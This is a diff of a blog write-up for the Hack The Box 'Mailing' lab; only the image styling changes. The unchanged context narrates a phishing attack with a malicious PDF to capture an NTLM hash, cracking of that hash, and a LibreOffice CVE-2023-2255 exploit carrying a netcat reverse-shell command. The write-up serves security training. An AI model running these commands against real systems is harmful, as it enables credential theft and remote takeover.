@@ -26,7 +26,7 @@ PORT    STATE SERVICE
 
 Looks like we have an email server and a web app here. I quickly check smb (nothing without auth), rpclient (same), enum4linux (same), and head to the IP in the browser to check port 80, which shows nothing but autocorrects in the URL bar to `mailing.htb`, so I add that to my `/etc/hosts` and move on. There is a lot to check right off the bat. 
 
-![Mailing2.png](/assets/images/Mailing/Mailing2.png){: .center-aligned width="600px"}
+![Mailing2.png](/assets/images/Mailing/Mailing2.png){: .responsive-image}
 
 We have a service name called `hMailServer`, we have potential users with the names of the employees, and we have a potential LFI vulnerability with the download link which ports to `http://mailing.htb/download.php?file=instructions.pdf`. Maybe we can pick another file there. I create a users.txt file with their names. For Ruy Alonso I add:
 
@@ -93,7 +93,7 @@ Set oApp = Nothing
 
 I can't seem to figure out a way to do anything with this though. The web server isn't an hMailServer app, it's just a website to help future users authenticate to it, so there isn't any way for me to log in with these credentials. They may help me log in to the server, but I can't do much, but send emails. So I try to send a pdf which will call back to my own machine allowing me to capture the NTLM hash and potentially authenticate with it. I use [Bad-PDF](https://github.com/deepzec/Bad-Pdf), and I am able to send it with the administrator credentials (though it does need to be administrator@mailing.htb). I send to maya@mailing.htb, because she is listed as support, and we can see her email in the Instructions PDF in one of the images.  
 
-![Mailing3.png](/assets/images/Mailing/Mailing3.png){: .center-aligned width="600px"}
+![Mailing3.png](/assets/images/Mailing/Mailing3.png){: .responsive-image}
 
 I get confirmation that the email is sent after using swaks (`swaks --to maya@mailing.htb --from pop@pop.com -ap --attach @bad1.pdf --server 10.10.11.14 --body "message" --header "Subject: Naughty PDF" --suppress-data`), but nothing happens to my Responder. 
 
@@ -104,20 +104,20 @@ Then the hash came in after I restarted my machine and started up responder, but
 
 Great. We get the NTLMv2 hash and attempt to crack it was hashcat (`hashcat -m 5600...`. 
 
-![Mailing4.png](/assets/images/Mailing/Mailing4.png){: .center-aligned width="600px"}
+![Mailing4.png](/assets/images/Mailing/Mailing4.png){: .responsive-image}
 
 And it cracks as `m4y4ngs4ri`. Now we have the credentials `maya`:`m4y4ngs4ri`, and we can log in with evil-winrm. 
 
-![Mailing5.png](/assets/images/Mailing/Mailing5.png){: .center-aligned width="600px"}
+![Mailing5.png](/assets/images/Mailing/Mailing5.png){: .responsive-image}
 
 I search around for a bit and notice that the C:\ drive contains both `inetpub` and `wwwroot` which makes me wonder whether there is an internal only web page, but that does not appear to be the case. I check for permissions and don't notice anything interesting. I try some DLL hijacking in the `C:\User\maya\Documents\mail.py` direction as suggested from winpeas.
 
-![Mailing6.png](/assets/images/Mailing/Mailing6.png){: .center-aligned width="600px"}
+![Mailing6.png](/assets/images/Mailing/Mailing6.png){: .responsive-image}
 
 
 I also try to re-write some files in the `C:\PHP`directory to see if they are somehow being called in a way that I can't see. 
 
-![Mailing7.png](/assets/images/Mailing/Mailing7.png){: .center-aligned width="600px"}
+![Mailing7.png](/assets/images/Mailing/Mailing7.png){: .responsive-image}
 
 No luck. It turns out to be a vulnerability with one of the Installed Programs - `Libre Office 7.4.0.1`. I do check the installed programs, but I never noticed this until directed at it by the Guided Mode in Hack The Box. Kind of a bummer. It looks like it is vulnerable `CVE-2023-2255` for which there is an exploit [here](https://github.com/elweth-sec/CVE-2023-2255.git)]. 
 
@@ -125,7 +125,7 @@ The suggested command is this: `python3 CVE-2023-2255.py --cmd 'wget https://raw
 
 Regardless, what the command does is use `/samples/test.odt` from the git directory to create a file where a macro runs the code you place in the `--cmd` parameter. Then the `.odt` file must still be executed by a admin process. I still needed to find that process, and I had already tried to figure that part out earlier. It turns out that this occurs in the `C:\Important Documents` directory, so it needs to be uploaded there because there is some process that cleans out this directory, and I guess that executes the file. So I uploaded `nc.exe` to `C:\Users\maya\Documents\nc.exe` and ran `python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\Users\maya\Documents\nc.exe -e cmd.exe 10.10.14.3 445' --output 'nc.odt'`, then placed the `nc.odt` file in the `C:\Important Documents` directory. 
 
-![Mailing8.png](/assets/images/Mailing/Mailing8.png){: .center-aligned width="600px"}
+![Mailing8.png](/assets/images/Mailing/Mailing8.png){: .responsive-image}
 
 And voila! We're admin, and I can grab the root.txt file. 
 
